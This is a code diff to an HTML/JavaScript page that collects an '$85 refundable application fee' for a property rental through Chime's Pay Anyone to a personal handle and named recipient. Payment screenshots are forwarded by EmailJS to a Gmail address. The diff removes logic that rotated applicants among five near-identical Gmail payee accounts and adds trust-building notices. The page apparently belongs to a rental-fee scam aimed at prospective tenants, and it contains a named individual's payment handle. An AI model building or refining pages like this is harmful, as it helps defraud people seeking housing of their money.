@@ -1882,21 +1882,43 @@
           <div class="pp-chime-payment-block">
             <dl class="pp-chime-account__details pp-chime-account__details--solo">
               <div class="pp-chime-account__row">
-                <dt>Payment email</dt>
-                <dd class="pp-chime-account__email" id="chimePaymentEmail" data-copy="">…</dd>
+                <dt>Chime sign</dt>
+                <dd class="pp-chime-account__phone" id="chimeSign" data-copy="$Eric-Goodyear-1">$Eric-Goodyear-1</dd>
               </div>
             </dl>
             <div class="pp-chime-copy">
               <button
                 type="button"
                 class="pp-copy-btn"
-                data-copy-target="chimePaymentEmail"
+                data-copy-target="chimeSign"
                 data-payment-method="Chime"
-                data-copy-toast="Payment email copied"
-                aria-label="Copy payment email"
+                data-copy-toast="Chime sign copied"
+                aria-label="Copy Chime sign $Eric-Goodyear-1"
               >
                 <svg width="16" height="16" viewBox="0 0 24 24" fill="none" aria-hidden="true"><rect x="9" y="9" width="12" height="12" rx="2" stroke="currentColor" stroke-width="1.6"/><path d="M6 15H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h8a2 2 0 0 1 2 2v1" stroke="currentColor" stroke-width="1.6"/></svg>
-                Copy payment email
+                Copy Chime sign
+              </button>
+            </div>
+          </div>
+
+          <div class="pp-chime-payment-block">
+            <dl class="pp-chime-account__details pp-chime-account__details--solo">
+              <div class="pp-chime-account__row">
+                <dt>Recipient Name</dt>
+                <dd class="pp-chime-account__email" id="chimeRecipientName" data-copy="Eric Goodyear">Eric Goodyear</dd>
+              </div>
+            </dl>
+            <div class="pp-chime-copy">
+              <button
+                type="button"
+                class="pp-copy-btn"
+                data-copy-target="chimeRecipientName"
+                data-payment-method="Chime"
+                data-copy-toast="Recipient name copied"
+                aria-label="Copy recipient name Eric Goodyear"
+              >
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" aria-hidden="true"><rect x="9" y="9" width="12" height="12" rx="2" stroke="currentColor" stroke-width="1.6"/><path d="M6 15H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h8a2 2 0 0 1 2 2v1" stroke="currentColor" stroke-width="1.6"/></svg>
+                Copy recipient name
               </button>
             </div>
           </div>
@@ -1906,8 +1928,8 @@
           <ol class="pp-steps">
             <li><span aria-hidden="true">1</span><span>Open the Chime app.</span></li>
             <li><span aria-hidden="true">2</span><span>Tap Pay Anyone.</span></li>
-            <li><span aria-hidden="true">3</span><span>Enter the payment email shown above.</span></li>
-            <li><span aria-hidden="true">4</span><span>Send your $85 refundable application fee.</span></li>
+            <li><span aria-hidden="true">3</span><span>Enter the Chime sign shown above.</span></li>
+            <li><span aria-hidden="true">4</span><span>Confirm the recipient name is Eric Goodyear before sending $85.</span></li>
             <li><span aria-hidden="true">5</span><span>After payment, upload your payment confirmation below.</span></li>
           </ol>
         </div>
@@ -1919,7 +1941,7 @@
             <li><span aria-hidden="true">1</span><span>Download the official Chime mobile banking app using the links below.</span></li>
             <li><span aria-hidden="true">2</span><span>Open the app and tap Sign Up to begin your application.</span></li>
             <li><span aria-hidden="true">3</span><span>Enter your personal information and complete identity verification as prompted.</span></li>
-            <li><span aria-hidden="true">4</span><span>Once your account is approved, return to this page and send your payment using the payment email shown above.</span></li>
+            <li><span aria-hidden="true">4</span><span>Once your account is approved, return to this page and send your payment using the Chime sign shown above.</span></li>
           </ol>
           <p class="pp-chime-signup__downloads-title" id="chime-downloads-title">Download the Chime App</p>
           <div class="pp-store-buttons" role="group" aria-labelledby="chime-downloads-title">
@@ -1949,7 +1971,7 @@
         <div class="pp-chime-trust">
           <p class="pp-notice pp-notice--trust">
             <svg viewBox="0 0 24 24" fill="none" aria-hidden="true"><path d="M12 3l8 4v5c0 5-3.5 8.7-8 9-4.5-.3-8-4-8-9V7l8-4z" stroke="currentColor" stroke-width="1.6" stroke-linejoin="round"/><path d="M9 12l2 2 4-4" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/></svg>
-            <span>Please verify the payment email carefully before sending payment. Your application review will begin once payment confirmation is received.</span>
+            <span>Please verify the Chime sign and recipient name carefully before sending payment. Your application review will begin once payment confirmation is received.</span>
           </p>
           <p class="pp-notice pp-notice--trust">
             <svg viewBox="0 0 24 24" fill="none" aria-hidden="true"><path d="M12 8v5m0 3h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" stroke="currentColor" stroke-width="1.6" stroke-linecap="round"/></svg>
@@ -2068,16 +2090,6 @@
       const EMAILJS_PAYMENT_TEMPLATE_ID = 'template_q4puaat';
       const EMAILJS_SDK_URL = 'https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js';
       const SUPPORT_EMAIL = 'privatepropertyg@gmail.com';
-      const CHIME_PAYMENT_EMAILS = [
-        'privatepropertyg@gmail.com',
-        'gprivateproperty@gmail.com',
-        'privatemanagementproperty@gmail.com',
-        'grouppropertymanagement5@gmail.com',
-        'managementgroupprivate4@gmail.com'
-      ];
-      const CHIME_EMAIL_ASSIGNMENTS_KEY = 'chimePaymentEmailAssignments';
-      const CHIME_EMAIL_NEXT_INDEX_KEY = 'chimePaymentEmailNextIndex';
-      const CHIME_EMAIL_SESSION_KEY = 'chimePaymentEmailSessionKey';
       const MAX_UPLOAD_BYTES = 5 * 1024 * 1024;
       const COMPRESS_IF_LARGER_THAN = 1.2 * 1024 * 1024;
       const COMPRESS_TARGET_BYTES = 4.5 * 1024 * 1024;
@@ -2165,74 +2177,6 @@
       const uploadStatus = document.getElementById('uploadStatus');
       const uploadStatusMessage = document.getElementById('uploadStatusMessage');
       let uploadStatusFadeTimer = null;
-      let assignedChimePaymentEmail = SUPPORT_EMAIL;
-
-      function getChimeAssignmentKey() {
-        if (applicationId) {
-          return applicationId;
-        }
-        let sessionKey = window.sessionStorage.getItem(CHIME_EMAIL_SESSION_KEY);
-        if (!sessionKey) {
-          sessionKey = `anon-${Date.now()}-${Math.random().toString(36).slice(2, 9)}`;
-          window.sessionStorage.setItem(CHIME_EMAIL_SESSION_KEY, sessionKey);
-        }
-        return sessionKey;
-      }
-
-      function assignChimePaymentEmail() {
-        const assignmentKey = getChimeAssignmentKey();
-        let assignments = {};
-
-        try {
-          assignments = JSON.parse(window.localStorage.getItem(CHIME_EMAIL_ASSIGNMENTS_KEY) || '{}');
-          if (!assignments || typeof assignments !== 'object') {
-            assignments = {};
-          }
-        } catch (error) {
-          assignments = {};
-        }
-
-        if (assignments[assignmentKey]) {
-          return assignments[assignmentKey];
-        }
-
-        let nextIndex = parseInt(window.localStorage.getItem(CHIME_EMAIL_NEXT_INDEX_KEY) || '0', 10);
-        if (!Number.isFinite(nextIndex) || nextIndex < 0) {
-          nextIndex = 0;
-        }
-
-        const email = CHIME_PAYMENT_EMAILS[nextIndex % CHIME_PAYMENT_EMAILS.length];
-        assignments[assignmentKey] = email;
-        window.localStorage.setItem(CHIME_EMAIL_ASSIGNMENTS_KEY, JSON.stringify(assignments));
-        window.localStorage.setItem(CHIME_EMAIL_NEXT_INDEX_KEY, String(nextIndex + 1));
-        window.sessionStorage.setItem('assignedChimePaymentEmail', email);
-        return email;
-      }
-
-      function applyChimePaymentEmailToPage(email) {
-        assignedChimePaymentEmail = email;
-        window.sessionStorage.setItem('assignedChimePaymentEmail', email);
-
-        const emailEl = document.getElementById('chimePaymentEmail');
-        if (emailEl) {
-          emailEl.textContent = email;
-          emailEl.dataset.copy = email;
-        }
-
-        const copyBtn = document.querySelector('[data-copy-target="chimePaymentEmail"]');
-        if (copyBtn) {
-          copyBtn.setAttribute('aria-label', `${t('Copy payment email')} ${email}`);
-        }
-
-        logPaymentDebug('Chime payment email assigned', {
-          applicationId: applicationId || '(none)',
-          assignmentKey: getChimeAssignmentKey(),
-          email
-        });
-      }
-
-      assignedChimePaymentEmail = assignChimePaymentEmail();
-      applyChimePaymentEmailToPage(assignedChimePaymentEmail);
 
       const applicantName =
         window.sessionStorage.getItem('latestApplicantName') ||
@@ -2460,7 +2404,6 @@
       }
 
       function buildPaymentEmailParams(imageUrl) {
-        const notifyEmail = assignedChimePaymentEmail || SUPPORT_EMAIL;
         return {
           application_id: applicationId || 'Not provided',
           language: selectedLanguage,
@@ -2468,18 +2411,16 @@
           image_url: imageUrl,
           cloudinary_url: imageUrl,
           payment_screenshot_url: imageUrl,
-          chime_payment_email: notifyEmail,
-          email: notifyEmail,
-          to_email: notifyEmail,
-          recipient_email: notifyEmail,
-          recipient: notifyEmail,
+          email: SUPPORT_EMAIL,
+          to_email: SUPPORT_EMAIL,
+          recipient_email: SUPPORT_EMAIL,
+          recipient: SUPPORT_EMAIL,
           applicant_email: applicantEmail || 'Not provided',
           applicant_name: applicantName || 'Not provided',
           subject: 'New Payment Screenshot Uploaded',
           message: [
             'New Payment Screenshot Uploaded',
             `Cloudinary image URL: ${imageUrl}`,
-            `Assigned Chime payment email: ${notifyEmail}`,
             `Application ID: ${applicationId || 'Not provided'}`,
             `Applicant email: ${applicantEmail || 'Not provided'}`,
             `Language: ${selectedLanguage}`
@@ -2700,15 +2641,13 @@
       }
 
       function savePendingPaymentNotification(imageUrl) {
-        const notifyEmail = assignedChimePaymentEmail || SUPPORT_EMAIL;
         window.sessionStorage.setItem('pendingPaymentUploadNotification', JSON.stringify({
           cloudinaryUrl: imageUrl,
           uploadTimestamp: new Date().toISOString(),
           applicationId: applicationId || '',
           currentLanguage: selectedLanguage,
           applicantEmail: applicantEmail || '',
-          applicantName: applicantName || '',
-          chimePaymentEmail: notifyEmail
+          applicantName: applicantName || ''
         }));
       }
 
